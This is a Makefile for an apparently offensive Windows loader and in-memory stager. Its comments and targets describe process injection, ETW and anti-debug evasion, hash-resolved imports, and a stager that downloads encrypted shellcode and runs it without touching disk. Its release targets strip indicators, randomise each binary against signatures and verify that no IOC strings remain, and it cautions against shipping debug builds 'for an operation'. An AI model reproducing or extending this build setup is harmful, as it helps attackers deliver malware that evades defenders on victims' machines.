CC        = x86_64-w64-mingw32-gcc
CC_LINUX  = gcc
BUILDDIR  = build
SRCDIR    = src

# F3/F2-b: loader uses CNG (cng.c) + HMAC (hmac.c) + keyderive (keyderive.c),
# no hand-rolled AES (no S-box in binary), no -lwinhttp (resolved by hash).
LOADER_SRC = $(SRCDIR)/aes-main.c $(SRCDIR)/cng.c $(SRCDIR)/cng_hmac.c $(SRCDIR)/http.c $(SRCDIR)/inject.c \
             $(SRCDIR)/peb.c $(SRCDIR)/halos.c $(SRCDIR)/etw.c $(SRCDIR)/antidebug.c $(SRCDIR)/camouflage.c \
             $(SRCDIR)/remote_hwbp.c

# Encoder sources (uses aes.c for encryption + keyderive.c/hmac.c for derive mode)
ENCODER_SRC = $(SRCDIR)/encode2aes.c $(SRCDIR)/aes.c $(SRCDIR)/keyderive.c $(SRCDIR)/hmac.c

# ---- Build flags ----
CFLAGS_RELEASE = -Os -s -DDEBUG=0 -ffunction-sections -fdata-sections \
                 -fno-asynchronous-unwind-tables -fno-exceptions -fno-unwind-tables
LDFLAGS_RELEASE = -static -mwindows -Wl,--gc-sections

CFLAGS_DEBUG = -g -DDEBUG=1
LDFLAGS_DEBUG = -static -mwindows

CFLAGS  = $(CFLAGS_DEBUG)
LDFLAGS = $(LDFLAGS_DEBUG)

# ---- Default: loader + Linux encoder (the two tools the workflow uses).
# ---- The Windows encode2aes.exe target is kept below for completeness but
# ---- isn't part of `all` — build it explicitly if you need it.
all: $(BUILDDIR)/loader.exe $(BUILDDIR)/encode2aes-linux

$(BUILDDIR):
	mkdir -p $(BUILDDIR)

# ---- Windows loader ----
$(BUILDDIR)/loader.exe: $(LOADER_SRC) | $(BUILDDIR)
	$(CC) $(CFLAGS) -o $@ $(LOADER_SRC) $(LDFLAGS)

# ---- Windows AES encoder ----
$(BUILDDIR)/encode2aes.exe: $(ENCODER_SRC) | $(BUILDDIR)
	$(CC) $(CFLAGS) -static -o $@ $(ENCODER_SRC) -lbcrypt

# ---- Linux AES encoder ----
encode2aes-linux: $(BUILDDIR)/encode2aes-linux

$(BUILDDIR)/encode2aes-linux: $(ENCODER_SRC) | $(BUILDDIR)
	$(CC_LINUX) -g -o $@ $(ENCODER_SRC)

# ---- Debug build (console output) ----
# N2: WARNING — debug builds compile in DBG_PRINTF format strings that contain
# plaintext Nt* syscall names. This is for LOCAL TESTING ONLY. Do NOT ship a
# debug build for an operation — use `make release` or `make release-nocrt`.
debug: $(LOADER_SRC) | $(BUILDDIR)
	$(CC) $(CFLAGS_DEBUG) -o $(BUILDDIR)/loader.exe $(LOADER_SRC) $(LDFLAGS_DEBUG)
	@echo ""
	@echo "=== WARNING: debug build — Nt* names in .rdata, do NOT ship ==="
	@echo "=== Use 'make release' or 'make release-nocrt' for operations ==="

# ---- Release build (optimized, stripped, no debug) ----
release: $(LOADER_SRC) | $(BUILDDIR)
	$(CC) $(CFLAGS_RELEASE) -o $(BUILDDIR)/loader.exe $(LOADER_SRC) $(LDFLAGS_RELEASE)

# ---- Release build + IOC string verification ----
release-verify: release
	@echo "=== release-verify: running IOC string check ==="
	@python3 tools/check_iocs.py build/loader.exe; \
	rc=$$?; \
	if [ $$rc -eq 0 ]; then \
		echo "=== release-verify: PASS — no IOC strings detected ==="; \
	else \
		echo "=== release-verify: FAIL — IOC strings detected (see above) ==="; \
	fi; \
	exit $$rc

# ---- F19: no-CRT build (drops msvcrt.dll + mingw runtime strings) ----
release-nocrt: $(LOADER_SRC) $(SRCDIR)/nocrt_runtime.c | $(BUILDDIR)
	$(CC) $(CFLAGS_RELEASE) -nostdlib -nostartfiles \
	    -e mainCRTStartup \
	    -o $(BUILDDIR)/loader-nocrt.exe \
	    $(LOADER_SRC) $(SRCDIR)/nocrt_runtime.c -lkernel32 -Wl,--gc-sections
	@echo "=== release-nocrt: built (no CRT) ==="
	@python3 tools/check_iocs.py $(BUILDDIR)/loader-nocrt.exe || true

# ---- Donut-wrapped in-memory stager ----
# Downloads a Donut-encrypted shellcode blob and jumps. No PE touches disk
# beyond the stager itself. See src/stager.c + scripts/donut-wrap.sh.
STAGER_SRC = $(SRCDIR)/stager.c $(SRCDIR)/http.c $(SRCDIR)/peb.c \
             $(SRCDIR)/halos.c $(SRCDIR)/camouflage.c

stager: $(STAGER_SRC) | $(BUILDDIR)
	$(CC) $(CFLAGS_RELEASE) -o $(BUILDDIR)/stager.exe $(STAGER_SRC) $(LDFLAGS_RELEASE)
	@python3 tools/check_iocs.py $(BUILDDIR)/stager.exe || true

stager-debug: $(STAGER_SRC) | $(BUILDDIR)
	$(CC) $(CFLAGS_DEBUG) -o $(BUILDDIR)/stager.exe $(STAGER_SRC) $(LDFLAGS_DEBUG)

# ---- F22: build-to-build randomization ----
# N8: always regenerate build_id.h so each `make release-random` produces a
# unique binary (the old target reused the stale header if it existed).
release-random:
	@python3 tools/build_id.py > $(SRCDIR)/build_id.h
	$(CC) $(CFLAGS_RELEASE) -DDARKCRYPT_BUILD_ID \
	    -o $(BUILDDIR)/loader-rand.exe $(LOADER_SRC) $(LDFLAGS_RELEASE)
	@python3 tools/check_iocs.py $(BUILDDIR)/loader-rand.exe; \
	echo "=== release-random: built with randomized build_id ==="

# Keep the standalone target for manual regeneration (not used by
# release-random anymore, which regenerates inline).
$(SRCDIR)/build_id.h:
	@python3 tools/build_id.py > $(SRCDIR)/build_id.h

# ---- Clean ----
clean:
	rm -rf $(BUILDDIR)/*

.PHONY: all encode2aes-linux debug release release-verify stager stager-debug clean